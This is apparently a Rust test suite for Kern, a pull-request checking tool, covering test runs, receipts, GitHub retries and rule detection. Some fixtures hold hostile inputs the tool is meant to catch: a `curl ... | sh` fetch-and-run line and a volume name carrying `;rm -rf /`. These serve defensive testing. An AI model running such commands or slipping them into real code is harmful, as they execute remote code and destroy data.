use kern::proof::{Count, Report};
use kern::util::*;
use kern::{check, drive, policy, receipt, suite};
use serde_json::{Value, json};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::process::Command;

struct Temp(PathBuf);
impl Temp {
    fn new() -> Temp {
        let p = std::env::temp_dir().join(format!("kern-reliability-{}", uuid4().unwrap()));
        std::fs::create_dir_all(&p).unwrap();
        Temp(p)
    }
}
impl Drop for Temp {
    fn drop(&mut self) { let _ = std::fs::remove_dir_all(&self.0); }
}

fn git(dir: &Path, args: &[&str]) -> String {
    let out = Command::new("git").args(args).current_dir(dir).env("GIT_AUTHOR_NAME", "t").env("GIT_AUTHOR_EMAIL", "t@t").env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@t").env("GIT_CONFIG_NOSYSTEM", "1").output().unwrap();
    assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}
fn write(dir: &Path, path: &str, text: &str) {
    let p = dir.join(path);
    std::fs::create_dir_all(p.parent().unwrap()).unwrap();
    std::fs::write(p, text).unwrap();
}
fn repo(t: &Temp, files: &[(&str, &str)]) -> (PathBuf, String) {
    let r = t.0.join("repo");
    std::fs::create_dir_all(&r).unwrap();
    git(&r, &["init", "-q", "-b", "main"]);
    git(&r, &["config", "core.autocrlf", "false"]);
    for (p, text) in files { write(&r, p, text); }
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-q", "--allow-empty", "-m", "base"]);
    let base = git(&r, &["rev-parse", "HEAD"]);
    (r, base)
}
fn commit(r: &Path, files: &[(&str, &str)]) -> String {
    for (p, text) in files { write(r, p, text); }
    git(r, &["add", "-A"]);
    git(r, &["commit", "-q", "-m", "change"]);
    git(r, &["rev-parse", "HEAD"])
}
fn operator() -> policy::Operator {
    policy::operator(&json!({ "version": 3, "repository": "acme/shop", "deployment": "single-vm", "executors": ["external"], "image": format!("sha256:{}", "a".repeat(64)),
        "builders": { "executor": null, "verifier": "e".repeat(64) }, "checks": [{ "id": "addition", "file": std::path::absolute("checks.json").unwrap(), "sha256": "b".repeat(64) }],
        "registry": "registry.npmjs.org", "permissions": {} })).unwrap()
}
fn report(tests: &[(&str, u32, u32, u32)], problems: &[&str]) -> Report {
    let mut t = BTreeMap::new();
    for (k, passed, failed, skipped) in tests { t.insert(k.to_string(), Count { passed: *passed, failed: *failed, skipped: *skipped }); }
    Report { tests: t, problems: problems.iter().map(|p| p.to_string()).collect() }
}
fn drive_json() -> Value { json!({ "base": "1111111111111111111111111111111111111111", "head": "2222222222222222222222222222222222222222", "skipped": [], "unmeasured": [] }) }
fn clean_rules() -> Value { json!({ "changed": [{ "path": "src/total.js", "operation": "modify" }], "powers": [], "tricks": [], "settings": [], "protected": [], "dependencies": [], "agent_notes": [], "not_checked": [] }) }
fn clean_tests() -> Value { json!({ "status": "RAN", "runner": "vitest", "before": { "passed": 12, "failed": 0, "skipped": 0 }, "after": { "passed": 12, "failed": 0, "skipped": 0 }, "kept": 12, "broke": [], "flaky": [], "gone": [], "newly_skipped": [], "added": [], "already_failing": [], "new_problems": [] }) }
fn off() -> Value { json!({ "status": "OFF", "why": "no AI key" }) }

const PACKAGE: &str = r#"{"name":"shop","devDependencies":{"vitest":"3.2.0"}}"#;
const MATH: &str = "export function sum(items) {\n  return items.reduce((a, b) => a + b, 0);\n}\nexport function product(items) {\n  return items.reduce((a, b) => a * b, 1);\n}\n";
const TOTAL: &str = "import { sum } from './math.js';\n\nexport function total(items) {\n  return sum(items);\n}\n";
const TOTAL_TEST: &str = "import { total } from '../src/total.js';\nimport { test, expect } from 'vitest';\ntest('adds', () => expect(total([2, 3])).toBe(5));\n";

#[test]
fn a_suite_in_which_no_test_passed_before_is_not_reported_as_run() {
    let before = report(&[("t > needs the database", 0, 1, 0), ("t > needs the network", 0, 1, 0)], &[]);
    let after = report(&[("t > needs the database", 0, 1, 0), ("t > needs the network", 0, 1, 0)], &[]);
    let c = suite::compare(&before, &after, None);
    assert_eq!(c["status"], "NOT_RUN", "no test passed before or after, so the tests showed nothing: {c}");
}

#[test]
fn a_change_to_an_import_line_still_runs_the_tests() {
    let t = Temp::new();
    let (r, base) = repo(&t, &[("package.json", PACKAGE), ("src/math.js", MATH), ("src/total.js", TOTAL), ("test/total.test.js", TOTAL_TEST)]);
    let head = commit(&r, &[("src/total.js", &TOTAL.replace("import { sum }", "import { product as sum }"))]);
    let out = check::check(&r, &base, &head, &t.0.join("out"), &operator(), None, None).unwrap();
    assert_ne!(out["tests"], "NOTHING_TO_RUN", "total() now multiplies, and the test that passed before would fail: {out}");
}

#[test]
fn a_submodule_change_is_named_in_the_receipt() {
    let t = Temp::new();
    let (r, _) = repo(&t, &[("package.json", PACKAGE), ("src/math.js", MATH)]);
    git(&r, &["update-index", "--add", "--cacheinfo", "160000,1111111111111111111111111111111111111111,vendor/payments"]);
    git(&r, &["commit", "-q", "-m", "add submodule"]);
    let base = git(&r, &["rev-parse", "HEAD"]);
    git(&r, &["update-index", "--cacheinfo", "160000,2222222222222222222222222222222222222222,vendor/payments"]);
    git(&r, &["commit", "-q", "-m", "move submodule"]);
    let head = git(&r, &["rev-parse", "HEAD"]);
    check::check(&r, &base, &head, &t.0.join("out"), &operator(), None, None).unwrap();
    let md = std::fs::read_to_string(t.0.join("out").join("receipt.md")).unwrap();
    assert!(md.contains("vendor/payments"), "the change points the project at other code, yet the receipt never names it:\n{md}");
}

#[test]
fn a_package_whose_tests_kern_runs_gets_its_dependencies_installed() {
    let t = Temp::new();
    let kit = r#"{"name":"kit","devDependencies":{"vitest":"3.2.0","left-pad":"1.3.0"}}"#;
    let (r, base) = repo(&t, &[("package.json", r#"{"name":"mono","private":true}"#), ("packages/kit/package.json", kit), ("packages/kit/src/pad.js", "export const pad = (s) => s;\n"),
        ("packages/kit/test/pad.test.js", "import { test, expect } from 'vitest';\nimport { pad } from '../src/pad.js';\ntest('pads', () => expect(pad('a')).toBe('a'));\n")]);
    let head = commit(&r, &[("packages/kit/test/pad.test.js", "import { test, expect } from 'vitest';\nimport { pad } from '../src/pad.js';\ntest('pads', () => expect(pad('b')).toBe('b'));\n")]);
    let has = |d: &str| d == "packages/kit";
    assert_eq!(suite::packages(&["packages/kit/test/pad.test.js"], has), ["packages/kit"], "Kern runs the tests of packages/kit");
    let out = t.0.join("out");
    drive::prepare(&r, &base, &head, &out, None).unwrap();
    assert!(drive::setup(&out, &operator(), u64::MAX).is_err(), "no Docker here, so setup stops after it writes its plan");
    let plan = read_json(out.join("sandbox").join("setup-new").join("drive-setup.json")).or_else(|_| read_json(out.join("sandbox").join("setup-old").join("drive-setup.json"))).unwrap();
    let dirs: Vec<String> = plan["dirs"].as_array().unwrap().iter().map(|d| d.as_str().unwrap().to_string()).collect();
    assert!(dirs.contains(&"packages/kit".to_string()), "Kern runs the tests of packages/kit but installs only {dirs:?}, so vitest and left-pad are missing there");
}

#[test]
fn a_receipt_whose_package_tests_did_not_run_does_not_say_nothing_unexpected() {
    let mut t = clean_tests();
    t["runner"] = json!("vitest in packages/kit");
    t["not_run"] = json!([{ "dir": "apps/web", "why": "Kern runs the tests of at most 5 packages per change" }]);
    let r = receipt::build(&drive_json(), &clean_rules(), &t, &off());
    let md = receipt::markdown(&r, None);
    assert!(!md.contains("### ✅ Kern: Nothing unexpected\n"), "the tests of apps/web never ran, yet the receipt opens with an unqualified pass:\n{md}");
}

#[test]
fn a_change_that_adds_large_text_fixtures_is_still_checked() {
    let t = Temp::new();
    let (r, base) = repo(&t, &[("package.json", PACKAGE), ("src/math.js", MATH)]);
    let line = format!("{}\n", "x".repeat(1023));
    let fixture = line.repeat(1000);
    let files: Vec<(String, String)> = (0..70).map(|i| (format!("test/fixtures/case{i:02}.txt"), format!("{i}\n{fixture}"))).collect();
    let refs: Vec<(&str, &str)> = files.iter().map(|(p, s)| (p.as_str(), s.as_str())).collect();
    let head = commit(&r, &refs);
    let out = drive::prepare(&r, &base, &head, &t.0.join("out"), None);
    assert!(out.is_ok(), "70 text fixtures of 1 MB each are an ordinary change: {:?}", out.err().map(|e| e.0));
}

type Seen = std::sync::Arc<std::sync::Mutex<Vec<(String, String, String)>>>;
fn stub_github(route: impl Fn(&str, &str) -> (u16, String) + Send + Sync + 'static) -> (String, Seen) {
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let url = format!("http://{}", listener.local_addr().unwrap());
    let seen: Seen = Default::default();
    let log = seen.clone();
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            let Ok(mut s) = stream else { continue };
            let mut reader = std::io::BufReader::new(s.try_clone().unwrap());
            let mut request = String::new();
            if std::io::BufRead::read_line(&mut reader, &mut request).is_err() { continue; }
            let mut length = 0usize;
            loop {
                let mut line = String::new();
                if std::io::BufRead::read_line(&mut reader, &mut line).unwrap_or(0) == 0 || line == "\r\n" { break; }
                if let Some(v) = line.to_ascii_lowercase().strip_prefix("content-length:") { length = v.trim().parse().unwrap_or(0); }
            }
            let mut body = vec![0u8; length];
            let _ = std::io::Read::read_exact(&mut reader, &mut body);
            let parts: Vec<&str> = request.split_whitespace().collect();
            let (method, path) = (parts.first().copied().unwrap_or("").to_string(), parts.get(1).copied().unwrap_or("").to_string());
            log.lock().unwrap().push((method.clone(), path.clone(), String::from_utf8_lossy(&body).to_string()));
            let (status, reply) = route(&method, &path);
            let _ = std::io::Write::write_all(&mut s, format!("HTTP/1.1 {status} X\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{reply}", reply.len()).as_bytes());
        }
    });
    (url, seen)
}
fn posted_status(tests: Value) -> String {
    let t = Temp::new();
    receipt::write(&t.0, &receipt::build(&drive_json(), &clean_rules(), &tests, &off()), None).unwrap();
    let (url, seen) = stub_github(|m, p| match (m, p) {
        ("GET", p) if p.starts_with("/repos/acme/shop/pulls/7") => (200, r#"{"head":{"sha":"2222222222222222222222222222222222222222"}}"#.into()),
        ("GET", p) if p.starts_with("/repos/acme/shop/issues/7/comments") => (200, "[]".into()),
        ("POST", _) => (201, r#"{"id":5,"html_url":"https://github.com/acme/shop/pull/7#c5"}"#.into()),
        _ => (404, "{}".into()),
    });
    receipt::post(&kern::github::Api::new(&url, "t").unwrap(), &t.0, "acme/shop", 7).unwrap();
    let log = seen.lock().unwrap().clone();
    let body = &log.iter().find(|(m, p, _)| m == "POST" && p.contains("/statuses/")).unwrap().2;
    serde_json::from_str::<Value>(body).unwrap()["description"].as_str().unwrap().to_string()
}

#[test]
fn a_status_for_a_receipt_whose_tests_did_not_run_differs_from_one_whose_tests_passed() {
    let ran = posted_status(clean_tests());
    let not_run = posted_status(json!({ "status": "NOT_RUN", "why": "Kern could not run the tests: Sandbox unavailable" }));
    assert_ne!(not_run, ran, "the Kern status is all a merge rule and the checks list show, and it reads the same whether the tests passed or never ran");
}

#[test]
fn a_receipt_after_a_thousand_comments_is_still_found() {
    let (url, _) = stub_github(|m, p| {
        if m != "GET" || !p.starts_with("/repos/acme/shop/issues/7/comments") { return (404, "{}".into()); }
        let page: u64 = p.split("page=").last().and_then(|n| n.parse().ok()).unwrap_or(1);
        if page <= 10 {
            let others: Vec<Value> = (0..100).map(|i| json!({ "id": page * 1000 + i, "user": { "login": "renovate[bot]" }, "body": "Bump a dependency" })).collect();
            return (200, json!(others).to_string());
        }
        if page == 11 { return (200, json!([{ "id": 99, "user": { "login": "github-actions[bot]" }, "body": "<!-- kern-receipt -->\n### ⚠️ Kern: 1 thing needs a look\n", "html_url": "https://github.com/acme/shop/pull/7#c99" }]).to_string()); }
        (200, "[]".into())
    });
    let v = receipt::verify(&kern::github::Api::new(&url, "t").unwrap(), "acme/shop", 7, &json!({ "keys": [] }), None).unwrap();
    assert_eq!(v["status"], "UNSIGNED", "Kern's receipt is the 1,001st comment; Kern says there is none: {v}");
}

#[test]
fn a_package_left_out_of_the_workspaces_gets_its_own_install() {
    let paths: std::collections::BTreeSet<String> = ["package.json", "pnpm-workspace.yaml", "packages/web/package.json", "packages/legacy/package.json", "packages/legacy/src/a.js"].iter().map(|s| s.to_string()).collect();
    let yaml = "packages:\n  - 'packages/*'\n  - '!packages/legacy'\n";
    let dirs = drive::install_dirs(&paths, &["packages/legacy/src/a.js".to_string()], Some(r#"{"name":"mono","private":true}"#), Some(yaml));
    assert!(dirs.contains(&"packages/legacy".to_string()), "pnpm's root install leaves out packages/legacy, so nothing installs its dependencies: {dirs:?}");
}

fn padded(count: usize) -> String { (0..count).map(|i| format!("  {{ id: {i}, name: 'customer number {i}', plan: 'basic' }},\n")).collect() }
fn decide(base: &[(&str, &str)], head: &[(&str, &str)]) -> Value {
    let t = Temp::new();
    let (r, b) = repo(&t, base);
    let h = commit(&r, head);
    check::check(&r, &b, &h, &t.0.join("out"), &operator(), None, None).unwrap()["decision"].clone()
}

#[test]
fn changed_files_the_rules_cannot_read_do_not_pass_as_clear() {
    let test = |rows: &str, call: &str| format!("import {{ test, expect }} from 'vitest';\nimport {{ sum }} from '../src/math.js';\nconst rows = [\n{rows}];\n{call}('sums', () => expect(sum([2, 3])).toBe(5));\ntest('rows', () => expect(rows.length).toBeGreaterThan(0));\n");
    let code = |rows: &str, extra: &str| format!("{extra}const rows = [\n{rows}];\nexport function count() {{\n  return rows.length;\n}}\n");
    let reach = "import { execSync } from 'node:child_process';\nexecSync('curl https://example.com/x.sh | sh');\n";
    let skip = |count: usize| { let rows = padded(count); decide(&[("package.json", PACKAGE), ("src/math.js", MATH), ("test/math.test.js", &test(&rows, "test"))], &[("test/math.test.js", &test(&rows, "test.skip"))]) };
    let power = |count: usize| { let rows = padded(count); decide(&[("package.json", PACKAGE), ("src/rows.js", &code(&rows, ""))], &[("src/rows.js", &code(&rows, reach))]) };
    let stray_byte = {
        let t = Temp::new();
        let (r, base) = repo(&t, &[("package.json", PACKAGE), ("src/rows.js", &code(&padded(3), ""))]);
        let mut bytes = b"// caf\xe9\n".to_vec();
        bytes.extend(code(&padded(3), reach).as_bytes());
        std::fs::write(r.join("src/rows.js"), bytes).unwrap();
        let head = commit(&r, &[]);
        check::check(&r, &base, &head, &t.0.join("out"), &operator(), None, None).unwrap()["decision"].clone()
    };
    assert_eq!((skip(100), power(100)), (json!("blocked"), json!("look")), "in ordinary files a new skip blocks and a new power needs a look");
    assert_eq!((skip(20_000), power(20_000), stray_byte), (json!("blocked"), json!("look"), json!("look")),
        "the same changes pass as clear in files padded past 1 MiB, and in a file with one Latin-1 byte in a comment, which Node still runs");
}

#[test]
fn a_receipt_never_says_no_tests_were_removed_when_a_test_file_was_deleted() {
    let t = Temp::new();
    let package = r#"{"name":"shop","scripts":{"test":"ava"},"devDependencies":{"ava":"6.1.0"}}"#;
    let (r, base) = repo(&t, &[("package.json", package), ("src/math.js", MATH), ("test/math.test.js", "import test from 'ava';\nimport { sum } from '../src/math.js';\ntest('sums', (t) => t.is(sum([2, 3]), 5));\n")]);
    std::fs::remove_file(r.join("test/math.test.js")).unwrap();
    let head = commit(&r, &[]);
    let out = check::check(&r, &base, &head, &t.0.join("out"), &operator(), None, None).unwrap();
    let md = std::fs::read_to_string(t.0.join("out").join("receipt.md")).unwrap();
    assert!(!md.contains("No skipped, focused or removed tests"), "the change deletes test/math.test.js and the tests did not run ({}), yet the receipt says:\n{md}", out["tests"]);
}

#[test]
fn github_hiccups_are_retried_and_a_receipt_comment_is_never_doubled() {
    use std::sync::atomic::{AtomicUsize, Ordering::SeqCst};
    let t = Temp::new();
    receipt::write(&t.0, &receipt::build(&drive_json(), &clean_rules(), &clean_tests(), &off()), None).unwrap();
    let (pulls, created, statuses) = (std::sync::Arc::new(AtomicUsize::new(0)), std::sync::Arc::new(AtomicUsize::new(0)), std::sync::Arc::new(AtomicUsize::new(0)));
    let (p, c, s) = (pulls.clone(), created.clone(), statuses.clone());
    let (url, seen) = stub_github(move |m, path| match (m, path) {
        ("GET", x) if x.starts_with("/repos/acme/shop/pulls/7") => {
            if p.fetch_add(1, SeqCst) < 2 { (502, "{}".into()) } else { (200, r#"{"head":{"sha":"2222222222222222222222222222222222222222"}}"#.into()) }
        }
        ("GET", x) if x.starts_with("/repos/acme/shop/issues/7/comments") => {
            if c.load(SeqCst) == 0 { return (200, "[]".into()); }
            (200, json!([{ "id": 5, "user": { "login": "github-actions[bot]" }, "body": "<!-- kern-receipt -->\nhalf", "html_url": "https://github.com/acme/shop/pull/7#c5" }]).to_string())
        }
        ("POST", "/repos/acme/shop/issues/7/comments") => { c.fetch_add(1, SeqCst); (502, "{}".into()) }
        ("PATCH", "/repos/acme/shop/issues/comments/5") => (200, "{}".into()),
        ("POST", x) if x.starts_with("/repos/acme/shop/statuses/") => if s.fetch_add(1, SeqCst) == 0 { (429, "{}".into()) } else { (201, "{}".into()) },
        _ => (404, "{}".into()),
    });
    let out = receipt::post(&kern::github::Api::new(&url, "t").unwrap(), &t.0, "acme/shop", 7);
    let log = seen.lock().unwrap().clone();
    let out = out.unwrap_or_else(|e| panic!("two 502s and a rate limit are ordinary GitHub hiccups: {} after {log:?}", e.0));
    assert_eq!(created.load(SeqCst), 1, "GitHub made the comment and then answered 502; asking again would post the receipt twice: {log:?}");
    assert!(log.iter().any(|(m, p, b)| m == "PATCH" && p.ends_with("/comments/5") && b.contains("kern-receipt")), "the comment GitHub made is filled in instead: {log:?}");
    assert_eq!(statuses.load(SeqCst), 2, "a rate-limited status is sent again: {log:?}");
    assert_eq!(out["state"], "success", "{out}");
}

#[test]
fn a_check_has_one_time_limit_and_each_run_gets_only_the_time_left() {
    let now = now_ms();
    assert_eq!(within(u64::MAX, 900), 900, "with no limit a run keeps its own");
    let left = within(now + 120_000, 900);
    assert!((118..=120).contains(&left), "two minutes left gives a run two minutes, not fifteen: {left}");
    assert_eq!(within(now.saturating_sub(1), 900), 0, "a limit already passed leaves nothing");
    assert_eq!(check::minutes(), 55, "the check ends well before the workflow's 75-minute job limit");
}

#[test]
fn a_check_killed_while_it_set_up_leaves_a_record_that_clean_reads() {
    let t = Temp::new();
    std::fs::write(t.0.join("volumes.txt"), "not-a-kern-volume\nkern-deps-x;rm -rf /\n").unwrap();
    let r = drive::clean(&t.0).unwrap();
    assert_eq!(r["removed"], json!([]), "only Kern's own volume names reach docker: {r}");
    assert!(!t.0.join("volumes.txt").exists(), "the record is gone once the volumes are");
}

#[test]
fn a_change_to_how_the_tests_run_needs_a_look_and_a_dependency_bump_does_not() {
    let settings = |base: &str, head: &str| -> Vec<Value> {
        let t = Temp::new();
        let (r, b) = repo(&t, &[("package.json", base), ("src/math.js", MATH)]);
        let h = commit(&r, &[("package.json", head)]);
        kern::rules::rules(&r, &b, &h).unwrap()["settings"].as_array().cloned().unwrap_or_default()
    };
    let script = |test: &str, vitest: &str| format!(r#"{{"name":"shop","scripts":{{"test":"{test}"}},"devDependencies":{{"vitest":"{vitest}"}}}}"#);
    assert!(settings(&script("vitest run", "3.2.0"), &script("vitest run", "3.2.4")).is_empty(), "a version bump leaves how the tests run alone");
    assert!(settings(&script("vitest run", "3.2.0"), &script("vitest", "3.2.0")).is_empty(), "vitest and vitest run run the same tests");
    let changed = settings(&script("vitest run", "3.2.0"), &script("vitest run --config fake.config.js", "3.2.0"));
    assert_eq!(changed.len(), 1, "a pull request that points the tests at another config changes which tests run: {changed:?}");
    assert_eq!(changed[0]["path"], "package.json");
    let jest = |block: &str| format!(r#"{{"name":"shop","scripts":{{"test":"jest"}},"devDependencies":{{"jest":"30.0.0"}},"jest":{block}}}"#);
    assert_eq!(settings(&jest(r#"{"testEnvironment":"node"}"#), &jest(r#"{"testEnvironment":"node","setupFiles":["./quiet.js"]}"#)).len(), 1,
        "jest settings kept in package.json decide which tests run as much as jest.config.js does");
}

#[test]
fn a_text_file_the_code_reads_is_not_documentation() {
    let allow = "import { readFileSync } from 'node:fs';\nexport const allowed = () => readFileSync(new URL('./allowlist.txt', import.meta.url), 'utf8').split('\\n');\n";
    let tests_after = |files: &[(&str, &str)], change: &[(&str, &str)]| -> Value {
        let t = Temp::new();
        let (r, b) = repo(&t, files);
        let h = commit(&r, change);
        check::check(&r, &b, &h, &t.0.join("out"), &operator(), None, None).unwrap()["tests"].clone()
    };
    let files = [("package.json", PACKAGE), ("src/allow.js", allow), ("src/allowlist.txt", "example.com\n"), ("README.md", "# shop\n")];
    assert_ne!(tests_after(&files, &[("src/allowlist.txt", "example.com\nevil.example\n")]), json!("NOTHING_TO_RUN"),
        "the code reads allowlist.txt, so a change to it changes what the code does and the tests must run");
    assert_eq!(tests_after(&files, &[("README.md", "# shop\n\nAdds up baskets.\n")]), json!("NOTHING_TO_RUN"), "no code reads the README");
}
